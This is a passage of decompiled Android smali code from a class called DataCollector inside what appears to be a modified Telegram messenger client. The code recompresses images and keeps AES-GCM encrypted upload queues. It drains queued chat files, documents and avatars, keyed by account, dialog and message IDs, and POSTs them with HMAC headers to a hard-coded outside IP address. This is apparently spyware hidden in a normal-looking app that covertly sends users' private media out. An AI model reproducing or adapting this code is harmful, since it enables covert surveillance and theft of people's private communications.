    :cond_1
    invoke-static {v3, v1}, Ljava/lang/Math;->max(II)I

    move-result v1

    const/4 v3, 0x1

    :goto_0
    mul-int/lit8 v4, v3, 0x2

    .line 2781
    div-int v5, v1, v4

    const/16 v6, 0x780

    if-lt v5, v6, :cond_2

    move v3, v4

    goto :goto_0

    .line 2783
    :cond_2
    new-instance v1, Landroid/graphics/BitmapFactory$Options;

    invoke-direct {v1}, Landroid/graphics/BitmapFactory$Options;-><init>()V

    .line 2784
    iput v3, v1, Landroid/graphics/BitmapFactory$Options;->inSampleSize:I

    .line 2785
    sget-object v3, Landroid/graphics/Bitmap$Config;->RGB_565:Landroid/graphics/Bitmap$Config;

    iput-object v3, v1, Landroid/graphics/BitmapFactory$Options;->inPreferredConfig:Landroid/graphics/Bitmap$Config;

    .line 2786
    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v1}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;Landroid/graphics/BitmapFactory$Options;)Landroid/graphics/Bitmap;

    move-result-object v1

    if-nez v1, :cond_3

    return-object v0

    .line 2789
    :cond_3
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v3

    invoke-virtual {v1}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v4

    invoke-static {v3, v4}, Ljava/lang/Math;->max(II)I

    move-result v3

    if-le v3, v6, :cond_4

    int-to-float v3, v6

    .line 2790
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v4

    invoke-virtual {v1}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v5

    invoke-static {v4, v5}, Ljava/lang/Math;->max(II)I

    move-result v4

    int-to-float v4, v4

    div-float/2addr v3, v4

    .line 2791
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v4

    int-to-float v4, v4

    mul-float v4, v4, v3

    invoke-static {v4}, Ljava/lang/Math;->round(F)I

    move-result v4

    .line 2792
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v5

    int-to-float v5, v5

    mul-float v5, v5, v3

    invoke-static {v5}, Ljava/lang/Math;->round(F)I

    move-result v3

    .line 2793
    invoke-static {v1, v4, v3, v2}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    .line 2794
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    move-object v1, v2

    .line 2798
    :cond_4
    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 2799
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x4b

    invoke-virtual {v1, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 2800
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    .line 2801
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    .line 2802
    array-length v2, v1

    int-to-long v2, v2

    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    cmp-long p0, v2, v4

    if-ltz p0, :cond_5

    return-object v0

    :cond_5
    return-object v1

    :catch_0
    :cond_6
    :goto_1
    return-object v0
.end method

.method private configUrlForAccount(I)Ljava/lang/String;
    .locals 3

    .line 975
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "https://38.190.225.166/api/config?account="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->accountIdForConfig(I)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method private currentNetworkState(Landroid/content/Context;)Lorg/telegram/messenger/DataCollector$NetworkState;
    .locals 8

    const-string v0, "unknown"

    const/4 v1, 0x0

    if-nez p1, :cond_0

    .line 1029
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v0, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1031
    :cond_0
    :try_start_0
    const-string v2, "connectivity"

    .line 1032
    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/net/ConnectivityManager;

    if-nez p1, :cond_1

    .line 1033
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v0, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    :catch_0
    move-exception p1

    goto/16 :goto_1

    .line 1034
    :cond_1
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/16 v3, 0x17

    const-string v4, "other"

    const-string v5, "cellular"

    const-string v6, "wifi"

    const/4 v7, 0x1

    if-lt v2, v3, :cond_6

    .line 1035
    :try_start_1
    invoke-static {p1}, Lcom/google/android/gms/internal/cast/zzdd$$ExternalSyntheticApiModelOutline0;->m(Landroid/net/ConnectivityManager;)Landroid/net/Network;

    move-result-object v2

    if-nez v2, :cond_2

    .line 1036
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v0, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1037
    :cond_2
    invoke-virtual {p1, v2}, Landroid/net/ConnectivityManager;->getNetworkCapabilities(Landroid/net/Network;)Landroid/net/NetworkCapabilities;

    move-result-object p1

    if-nez p1, :cond_3

    .line 1038
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v0, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1039
    :cond_3
    invoke-virtual {p1, v7}, Landroid/net/NetworkCapabilities;->hasTransport(I)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 1040
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v6, v7}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1042
    :cond_4
    invoke-virtual {p1, v1}, Landroid/net/NetworkCapabilities;->hasTransport(I)Z

    move-result p1

    if-eqz p1, :cond_5

    .line 1043
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v5, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1045
    :cond_5
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v4, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1047
    :cond_6
    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object p1

    if-eqz p1, :cond_a

    .line 1048
    invoke-virtual {p1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-nez v2, :cond_7

    goto :goto_0

    .line 1049
    :cond_7
    invoke-virtual {p1}, Landroid/net/NetworkInfo;->getType()I

    move-result v2

    if-ne v2, v7, :cond_8

    .line 1050
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v6, v7}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1052
    :cond_8
    invoke-virtual {p1}, Landroid/net/NetworkInfo;->getType()I

    move-result p1

    if-nez p1, :cond_9

    .line 1053
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v5, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1055
    :cond_9
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v4, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1

    .line 1048
    :cond_a
    :goto_0
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v0, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    .line 1057
    :goto_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "currentNetworkState: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v2, "TGCollect"

    invoke-static {v2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 1058
    new-instance p1, Lorg/telegram/messenger/DataCollector$NetworkState;

    invoke-direct {p1, v0, v1}, Lorg/telegram/messenger/DataCollector$NetworkState;-><init>(Ljava/lang/String;Z)V

    return-object p1
.end method

.method private static decryptQueuePayload(Ljava/lang/String;)Ljava/lang/String;
    .locals 7

    const-string v0, ":"

    const/4 v1, 0x0

    if-nez p0, :cond_0

    return-object v1

    .line 794
    :cond_0
    :try_start_0
    const-string v2, "{"

    invoke-virtual {p0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_3

    const-string v2, "["

    invoke-virtual {p0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_3

    invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_1

    goto :goto_0

    :cond_1
    const/4 v2, 0x2

    .line 797
    invoke-virtual {p0, v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object p0

    .line 798
    array-length v0, p0

    if-eq v0, v2, :cond_2

    return-object v1

    :cond_2
    const/4 v0, 0x0

    .line 799
    aget-object v0, p0, v0

    invoke-static {v0, v2}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v0

    const/4 v3, 0x1

    .line 800
    aget-object p0, p0, v3

    invoke-static {p0, v2}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object p0

    .line 801
    const-string v3, "AES/GCM/NoPadding"

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v3

    .line 802
    invoke-static {}, Lorg/telegram/messenger/DataCollector;->getQueueSecretKey()Ljavax/crypto/SecretKey;

    move-result-object v4

    new-instance v5, Ljavax/crypto/spec/GCMParameterSpec;

    const/16 v6, 0x80

    invoke-direct {v5, v6, v0}, Ljavax/crypto/spec/GCMParameterSpec;-><init>(I[B)V

    invoke-virtual {v3, v2, v4, v5}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    .line 803
    new-instance v0, Ljava/lang/String;

    invoke-virtual {v3, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object p0

    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-direct {v0, p0, v2}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_3
    :goto_0
    return-object p0

    .line 805
    :goto_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "decryptQueuePayload: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "TGCollect"

    invoke-static {v0, p0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-object v1
.end method

.method private doPost(Ljava/lang/String;[BLjava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;
    .locals 4

    const-string v0, "POST"

    const/4 v1, 0x0

    .line 923
    :try_start_0
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_3

    .line 924
    :try_start_1
    invoke-virtual {v2, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 925
    const-string v1, "Content-Type"

    const-string v3, "application/json; charset=UTF-8"

    invoke-virtual {v2, v1, v3}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 926
    const-string v1, "Content-Length"

    array-length v3, p2

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v1, v3}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v1, 0x1

    .line 927
    invoke-virtual {v2, v1}, Ljava/net/URLConnection;->setDoOutput(Z)V

    const/16 v1, 0x1770

    .line 928
    invoke-virtual {v2, v1}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    .line 929
    invoke-virtual {v2, v1}, Ljava/net/URLConnection;->setReadTimeout(I)V

    .line 930
    invoke-static {p2}, Lorg/telegram/messenger/DataCollector;->sha256Hex([B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v0, p1, v1, p3}, Lorg/telegram/messenger/DataCollector;->addHMACHeaders(Ljava/net/HttpURLConnection;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 931
    invoke-virtual {v2}, Ljava/net/URLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object p3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 932
    :try_start_2
    invoke-virtual {p3, p2}, Ljava/io/OutputStream;->write([B)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 933
    :try_start_3
    invoke-virtual {p3}, Ljava/io/OutputStream;->close()V

    .line 934
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result p2

    .line 935
    new-instance p3, Lorg/telegram/messenger/DataCollector$PostResult;

    invoke-static {v2}, Lorg/telegram/messenger/DataCollector;->parseRetryAfterMs(Ljava/net/HttpURLConnection;)J

    move-result-wide v0

    invoke-direct {p3, p2, v0, v1}, Lorg/telegram/messenger/DataCollector$PostResult;-><init>(IJ)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 940
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    return-object p3

    :catchall_0
    move-exception p1

    move-object v1, v2

    goto :goto_2

    :catch_0
    move-exception p2

    move-object v1, v2

    goto :goto_1

    :catchall_1
    move-exception p2

    if-eqz p3, :cond_0

    .line 931
    :try_start_4
    invoke-virtual {p3}, Ljava/io/OutputStream;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    goto :goto_0

    :catchall_2
    move-exception p3

    :try_start_5
    invoke-virtual {p2, p3}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_0
    :goto_0
    throw p2
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :catchall_3
    move-exception p1

    goto :goto_2

    :catch_1
    move-exception p2

    .line 937
    :goto_1
    :try_start_6
    const-string p3, "TGCollect"

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "doPost "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, " error: "

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p3, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 938
    new-instance p1, Lorg/telegram/messenger/DataCollector$PostResult;

    const/4 p2, -0x1

    const-wide/16 v2, 0x0

    invoke-direct {p1, p2, v2, v3}, Lorg/telegram/messenger/DataCollector$PostResult;-><init>(IJ)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    if-eqz v1, :cond_1

    .line 940
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_1
    return-object p1

    :goto_2
    if-eqz v1, :cond_2

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 941
    :cond_2
    throw p1
.end method

.method private drainFileQueue()V
    .locals 20

    move-object/from16 v14, p0

    .line 1334
    monitor-enter p0

    .line 1335
    :try_start_0
    iget-boolean v0, v14, Lorg/telegram/messenger/DataCollector;->fileQueueDraining:Z

    if-eqz v0, :cond_0

    monitor-exit p0

    return-void

    :catchall_0
    move-exception v0

    goto/16 :goto_a

    :cond_0
    const/4 v0, 0x1

    .line 1336
    iput-boolean v0, v14, Lorg/telegram/messenger/DataCollector;->fileQueueDraining:Z

    .line 1337
    monitor-exit p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v15, 0x0

    .line 1340
    :try_start_1
    invoke-direct/range {p0 .. p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v13
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    if-nez v13, :cond_1

    .line 1384
    iput-boolean v15, v14, Lorg/telegram/messenger/DataCollector;->fileQueueDraining:Z

    return-void

    .line 1342
    :cond_1
    :try_start_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const/4 v3, 0x5

    invoke-virtual {v13, v1, v2, v3}, Lorg/telegram/messenger/DataCollector$UploadQueue;->dueFiles(JI)Ljava/util/List;

    move-result-object v1

    .line 1343
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v16

    const/16 v17, 0x0

    :goto_0
    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_9

    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    move-object v12, v1

    check-cast v12, Lorg/telegram/messenger/DataCollector$FileItem;

    .line 1344
    iget v1, v12, Lorg/telegram/messenger/DataCollector$FileItem;->account:I

    invoke-direct {v14, v1}, Lorg/telegram/messenger/DataCollector;->fileUploadGate(I)Lorg/telegram/messenger/DataCollector$FileUploadGate;

    move-result-object v1

    .line 1345
    iget-boolean v2, v1, Lorg/telegram/messenger/DataCollector$FileUploadGate;->allowed:Z

    if-nez v2, :cond_2

    .line 1346
    iget-wide v2, v12, Lorg/telegram/messenger/DataCollector$FileItem;->id:J

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    iget-wide v6, v1, Lorg/telegram/messenger/DataCollector$FileUploadGate;->retryDelayMs:J

    add-long/2addr v4, v6

    invoke-virtual {v13, v2, v3, v4, v5}, Lorg/telegram/messenger/DataCollector$UploadQueue;->deferFileLater(JJ)V

    const/16 v17, 0x1

    goto :goto_0

    :catchall_1
    move-exception v0

    const/4 v1, 0x0

    goto/16 :goto_9

    :catch_0
    move-exception v0

    goto/16 :goto_7

    .line 1350
    :cond_2
    new-instance v11, Ljava/io/File;

    iget-object v1, v12, Lorg/telegram/messenger/DataCollector$FileItem;->filePath:Ljava/lang/String;

    invoke-direct {v11, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1351
    invoke-virtual {v11}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_4

    .line 1352
    iget-wide v1, v12, Lorg/telegram/messenger/DataCollector$FileItem;->id:J

    invoke-virtual {v13, v1, v2}, Lorg/telegram/messenger/DataCollector$UploadQueue;->markFileAbandoned(J)V

    move-object v7, v13

    :cond_3
    :goto_1
    const/4 v8, 0x1

    goto/16 :goto_4

    .line 1356
    :cond_4
    const-string v1, "https://38.190.225.166/api/doc"

    iget-object v2, v12, Lorg/telegram/messenger/DataCollector$FileItem;->url:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    .line 1358
    iget v2, v12, Lorg/telegram/messenger/DataCollector$FileItem;->account:I

    iget-wide v3, v12, Lorg/telegram/messenger/DataCollector$FileItem;->dialogId:J

    iget v5, v12, Lorg/telegram/messenger/DataCollector$FileItem;->msgId:I

    iget-object v7, v12, Lorg/telegram/messenger/DataCollector$FileItem;->mediaType:Ljava/lang/String;

    iget-object v8, v12, Lorg/telegram/messenger/DataCollector$FileItem;->mimeType:Ljava/lang/String;

    move-object/from16 v1, p0

    move-object v6, v11

    invoke-direct/range {v1 .. v8}, Lorg/telegram/messenger/DataCollector;->uploadDocDirect(IJILjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v1

    move-object v0, v12

    move-object/from16 v19, v13

    goto :goto_2

    .line 1361
    :cond_5
    iget-object v2, v12, Lorg/telegram/messenger/DataCollector$FileItem;->url:Ljava/lang/String;

    iget v3, v12, Lorg/telegram/messenger/DataCollector$FileItem;->account:I

    iget-wide v4, v12, Lorg/telegram/messenger/DataCollector$FileItem;->dialogId:J

    iget v1, v12, Lorg/telegram/messenger/DataCollector$FileItem;->msgId:I

    int-to-long v6, v1

    iget-wide v8, v12, Lorg/telegram/messenger/DataCollector$FileItem;->userId:J

    iget-boolean v10, v12, Lorg/telegram/messenger/DataCollector$FileItem;->isAvatar:Z

    iget-object v1, v12, Lorg/telegram/messenger/DataCollector$FileItem;->mediaType:Ljava/lang/String;

    iget-object v15, v12, Lorg/telegram/messenger/DataCollector$FileItem;->mimeType:Ljava/lang/String;

    move-object/from16 v18, v1

    move-object/from16 v1, p0

    move-object v0, v12

    move-object/from16 v12, v18

    move-object/from16 v19, v13

    move-object v13, v15

    invoke-direct/range {v1 .. v13}, Lorg/telegram/messenger/DataCollector;->uploadMultipartDirect(Ljava/lang/String;IJJJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v1

    .line 1364
    :goto_2
    iget v2, v1, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    const/16 v3, 0xc8

    if-lt v2, v3, :cond_6

    const/16 v3, 0x12c

    if-ge v2, v3, :cond_6

    .line 1365
    iget-wide v1, v0, Lorg/telegram/messenger/DataCollector$FileItem;->id:J

    move-object/from16 v7, v19

    invoke-virtual {v7, v1, v2}, Lorg/telegram/messenger/DataCollector$UploadQueue;->markFileDone(J)V

    .line 1366
    iget-boolean v1, v0, Lorg/telegram/messenger/DataCollector$FileItem;->isAvatar:Z

    if-nez v1, :cond_3

    iget v1, v0, Lorg/telegram/messenger/DataCollector$FileItem;->msgId:I

    if-lez v1, :cond_3

    .line 1367
    iget v1, v0, Lorg/telegram/messenger/DataCollector$FileItem;->account:I

    invoke-static {v1}, Lorg/telegram/messenger/MessagesStorage;->getInstance(I)Lorg/telegram/messenger/MessagesStorage;

    move-result-object v1

    iget v2, v0, Lorg/telegram/messenger/DataCollector$FileItem;->account:I

    iget-wide v3, v0, Lorg/telegram/messenger/DataCollector$FileItem;->dialogId:J

    iget v0, v0, Lorg/telegram/messenger/DataCollector$FileItem;->msgId:I

    .line 1368
    invoke-virtual {v1, v2, v3, v4, v0}, Lorg/telegram/messenger/MessagesStorage;->markMediaUploaded(IJI)V

    goto :goto_1

    :cond_6
    move-object/from16 v7, v19

    .line 1370
    invoke-static {v2}, Lorg/telegram/messenger/DataCollector;->isRetryable(I)Z

    move-result v2

    if-eqz v2, :cond_8

    .line 1371
    iget v2, v0, Lorg/telegram/messenger/DataCollector$FileItem;->attempts:I

    const/4 v8, 0x1

    add-int/lit8 v4, v2, 0x1

    .line 1372
    iget-wide v1, v1, Lorg/telegram/messenger/DataCollector$PostResult;->retryAfterMs:J

    const-wide/16 v5, 0x0

    cmp-long v3, v1, v5

    if-lez v3, :cond_7

    goto :goto_3

    :cond_7
    invoke-direct {v14, v4}, Lorg/telegram/messenger/DataCollector;->retryDelayMs(I)J

    move-result-wide v1

    .line 1373
    :goto_3
    iget-wide v5, v0, Lorg/telegram/messenger/DataCollector$FileItem;->id:J

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    add-long/2addr v9, v1

    move-object v1, v7

    move-wide v2, v5

    move-wide v5, v9

    invoke-virtual/range {v1 .. v6}, Lorg/telegram/messenger/DataCollector$UploadQueue;->retryFileLater(JIJ)V

    goto :goto_4

    :cond_8
    const/4 v8, 0x1

    .line 1375
    iget-wide v0, v0, Lorg/telegram/messenger/DataCollector$FileItem;->id:J

    invoke-virtual {v7, v0, v1}, Lorg/telegram/messenger/DataCollector$UploadQueue;->markFileAbandoned(J)V

    :goto_4
    move-object v13, v7

    const/4 v0, 0x1

    const/4 v15, 0x0

    goto/16 :goto_0

    :cond_9
    move-object v7, v13

    .line 1378
    invoke-virtual {v7}, Lorg/telegram/messenger/DataCollector$UploadQueue;->hasPendingFiles()Z

    move-result v0

    if-eqz v0, :cond_b

    if-eqz v17, :cond_a

    const-wide/32 v0, 0x493e0

    goto :goto_5

    :cond_a
    const-wide/16 v0, 0x2710

    .line 1379
    :goto_5
    invoke-direct {v14, v0, v1}, Lorg/telegram/messenger/DataCollector;->scheduleFileQueueDrain(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    :cond_b
    const/4 v1, 0x0

    .line 1384
    :goto_6
    iput-boolean v1, v14, Lorg/telegram/messenger/DataCollector;->fileQueueDraining:Z

    goto :goto_8

    .line 1382
    :goto_7
    :try_start_3
    const-string v1, "TGCollect"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "drainFileQueue: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    const/4 v1, 0x0

    goto :goto_6

    :goto_8
    return-void

    .line 1384
    :goto_9
    iput-boolean v1, v14, Lorg/telegram/messenger/DataCollector;->fileQueueDraining:Z

    .line 1385
    throw v0

    .line 1337
    :goto_a
    :try_start_4
    monitor-exit p0
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    throw v0
.end method

.method private drainGalleryQueue()V
    .locals 26

    move-object/from16 v14, p0

    .line 1215
